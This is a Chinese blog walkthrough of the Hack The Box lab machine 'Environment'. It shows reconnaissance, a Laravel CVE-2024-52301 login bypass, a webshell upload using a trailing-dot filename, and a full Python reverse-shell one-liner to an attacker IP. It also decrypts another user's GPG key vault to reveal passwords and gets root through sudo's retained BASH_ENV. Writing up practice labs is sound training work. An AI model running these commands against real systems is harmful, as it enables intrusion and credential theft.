---
title: HTB Environment
published: 2025-06-02
pinned: false
description: HTB Environment，渗透，wp
tags: ['HTB']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-06-02
pubDate: 2025-06-02
---


## 前言
一个很有意思的靶机，HTB中等难度

## 外网打点
按照惯例nmap+dirsearch
```
nmap -sC -sV 10.10.11.67        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 20:35 CST
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 46.63% done; ETC: 20:38 (0:01:29 remaining)
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 54.81% done; ETC: 20:39 (0:01:50 remaining)
Stats: 0:03:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 61.43% done; ETC: 20:40 (0:01:54 remaining)
Stats: 0:05:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 79.51% done; ETC: 20:42 (0:01:19 remaining)
Stats: 0:06:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 94.33% done; ETC: 20:43 (0:00:25 remaining)
Stats: 0:06:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 94.34% done; ETC: 20:43 (0:00:25 remaining)
Nmap scan report for 10.10.11.67
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

 python dirsearch.py -u http://environment.htb -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt     
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 20469

Target: http://environment.htb/

[20:45:45] Scanning:
[20:49:52] 301 -   169B - /build  ->  http://environment.htb/build/
[20:49:52] 301 -   169B - /build  ->  http://environment.htb/build/
[20:52:23] 200 -     0B - /favicon.ico
[20:55:04] 200 -    2KB - /login
[20:55:04] 302 -   358B - /logout  ->  http://environment.htb/login
[20:55:10] 405 -  244KB - /mailing
[20:58:33] 200 -    24B - /robots.txt
[21:00:09] 301 -   169B - /storage  ->  http://environment.htb/storage/
[21:01:19] 200 -    2KB - /up
[21:01:20] 405 -  244KB - /upload
[21:01:39] 301 -   169B - /vendor  ->  http://environment.htb/vendor/

Task Completed
```

有个很明显的登录页面，进去看看，随便输入试试
![image.png](https://www.helloimg.com/i/2025/06/02/683d46f115717.png)
有报错回显，但是目前不知道有什么可以打的地方  

`mailing`这个也可以访问，并且看见`PHP 8.2.28 — Laravel 11.30.0`，在登录去打[CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301)，并且这个页面好像可以泄漏部分源码的，但是我没怎么看，直接按照cve的打了  

成功登录之后发现有图片上传的地方，传个马上去，注意`*.php`的话访问只会下载，所以要`*.php.`
```
------WebKitFormBoundaryILrUEQYf3y8xqp85
Content-Disposition: form-data; name="upload"; filename="zsm.php."
Content-Type: image/png
```
成功拿到路径
```
{"url":"http:\/\/environment.htb\/storage\/files\/zsm.php","uploaded":"http:\/\/environment.htb\/storage\/files\/zsm.php"}
```
这个马是可以用的，但是不知道为什么`bash`弹一直出不来，我就直接用python弹了
>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.39",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

可以拿到user.txt
```
Connection from 10.10.11.67:44294
www-data@environment:~/app/storage/app/public/files$ ls
ls
bethany.png  hish.png  jono.png
www-data@environment:~/app/storage/app/public/files$ cd ~
cd ~
www-data@environment:~$ ls
ls
app  html
www-data@environment:~$ cd /home
cd /home
www-data@environment:/home$ ls
ls
hish
www-data@environment:/home$ cd hish
cd hish
www-data@environment:/home/hish$ ls
ls
backup	root.sh  user.txt
```

## 提权
先提权到用户`hish`，在`backup`里面发现好东西
```
www-data@environment:/home/hish/backup$ ls
ls
keyvault.gpg
```
有个gpg文件，找了个通用的方法
```
# 1. 拷贝 hish 用户的密钥目录
cp -r /home/hish/.gnupg /tmp/mygnupg

# 2. 设置权限
chmod -R 700 /tmp/mygnupg

# 3. 确认是否存在私钥
gpg --homedir /tmp/mygnupg --list-secret-keys

# 4. 解密 keyvault.gpg
gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg

www-data@environment:~$ ls /tmp
ls /tmp
message.txt
mygnupg
systemd-private-71ad283a49be45459b5ebdeb26ff8e08-systemd-logind.service-dwJgyf
systemd-private-71ad283a49be45459b5ebdeb26ff8e08-systemd-timesyncd.service-LkFYou
vmware-root_499-2117352874
www-data@environment:~$ cat /tmp/message.txt
cat /tmp/message.txt
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
www-data@environment:~$ su hish
su hish
Password: marineSPm@ster!!
```
这个时候就是用户权限了，先正常信息收集
```
hish@environment:/var/www$ sudo -l
sudo -l
[sudo] password for hish: marineSPm@ster!!

Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```
其中可以看到`env_keep`保留了`ENV`和`BASH_ENV`两个环境变量因此可以用于绕过
```
hish@environment:~$ echo 'bash -p' > exp.sh
echo 'bash -p' > exp.sh
hish@environment:~$ chmod +x exp.sh
chmod +x exp.sh
hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo
sudo BASH_ENV=./exp.sh /usr/bin/systeminfo
root@environment:/home/hish# id
id
uid=0(root) gid=0(root) groups=0(root)
root@environment:/home/hish# cat /root/*
cat /root/*
1ec8b9b660747555f3ee577fc32f3250
cat: /root/scripts: Is a directory
```

## 总结
知道cve很关键，感觉有必要屯一点cve的poc了，pgp文件很关键，要知道怎么做，最后就是环境变量的提权